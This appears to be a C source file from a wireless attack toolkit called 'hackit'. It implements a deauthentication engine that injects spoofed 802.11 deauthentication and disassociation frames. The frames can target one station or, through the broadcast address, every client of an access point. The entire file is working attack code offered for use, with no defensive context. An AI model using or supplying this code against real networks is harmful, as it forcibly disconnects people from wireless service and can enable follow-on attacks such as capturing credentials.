#include "deauth_engine.h"
#include "packet_injector.h"
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#ifdef _WIN32
#include <windows.h>
static void platform_sleep_ms(int ms) { Sleep((DWORD)ms); }
#else
#include <unistd.h>
static void platform_sleep_ms(int ms) { usleep((useconds_t)ms * 1000); }
#endif

static const uint8_t BROADCAST_MAC[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

/* ------------------------------------------------------------------ */

bool hackit_deauth_burst(const char* iface, const uint8_t* bssid,
                         const uint8_t* station, int count, int delay_ms) {
    if (!iface || !bssid || !station)
        return false;
    if (count <= 0) count = HACKIT_DEAUTH_DEFAULT_COUNT;
    if (delay_ms < 0) delay_ms = HACKIT_DEAUTH_DEFAULT_DELAY_MS;

    int sent = 0;
    bool any_success = false;

    for (int i = 0; i < count; i++) {
        bool ok = hackit_inject_deauth(iface, bssid, station,
                                       HACKIT_DEAUTH_REASON_UNSPECIFIED);
        if (ok) {
            sent++;
            any_success = true;
        } else {
            fprintf(stderr, "[DEAUTH] Frame %d/%d failed on '%s'\n",
                    i + 1, count, iface);
        }

        if (delay_ms > 0 && i < count - 1)
            platform_sleep_ms(delay_ms);
    }

    printf("[DEAUTH] Burst complete: %d/%d frames sent successfully\n", sent, count);
    return any_success;
}

/* ------------------------------------------------------------------ */

bool hackit_deauth_all_clients(const char* iface, const uint8_t* bssid, int count) {
    if (!iface || !bssid)
        return false;

    return hackit_deauth_burst(iface, bssid, BROADCAST_MAC, count,
                               HACKIT_DEAUTH_DEFAULT_DELAY_MS);
}

/* ------------------------------------------------------------------ */

bool hackit_deauth_targeted(const char* iface, const uint8_t* bssid,
                            const uint8_t* target_station, int count) {
    if (!iface || !bssid || !target_station)
        return false;

    return hackit_deauth_burst(iface, bssid, target_station, count,
                               HACKIT_DEAUTH_DEFAULT_DELAY_MS);
}

/* ------------------------------------------------------------------ */

bool hackit_deauth_association_req(const char* iface, const uint8_t* bssid) {
    if (!iface || !bssid)
        return false;

    uint8_t radiotap[12];
    memset(radiotap, 0, sizeof(radiotap));
    radiotap[2] = 0x0C; /* radiotap length = 12 */

    uint8_t frame[HACKIT_MAX_FRAME_LEN];
    memset(frame, 0, sizeof(frame));
    memcpy(frame, radiotap, 12);

    /* Frame Control: Disassociation (type=0, subtype=10) => 0xA0 0x00 */
    frame[12] = 0xA0;
    frame[13] = 0x00;

    /* Duration */
    frame[14] = 0x00;
    frame[15] = 0x00;

    /* Address 1 – destination (broadcast) */
    memset(&frame[16], 0xFF, 6);
    /* Address 2 – source (BSSID) */
    memcpy(&frame[22], bssid, 6);
    /* Address 3 – BSSID */
    memcpy(&frame[28], bssid, 6);

    /* Disassociation reason code (2 bytes) – "sending station is leaving" */
    frame[34] = 0x03;  /* reason 3: deauthenticated because sending station is leaving */
    frame[35] = 0x00;

    int total = 12 + 24 + 2; /* radiotap + mgmt header + reason */
    bool ok = hackit_inject_raw_frame(iface, frame, total);
    if (ok) {
        printf("[DEAUTH] Disassociation frame sent on '%s'\n", iface);
    } else {
        fprintf(stderr, "[DEAUTH] Failed to send disassociation frame on '%s'\n", iface);
    }
    return ok;
}
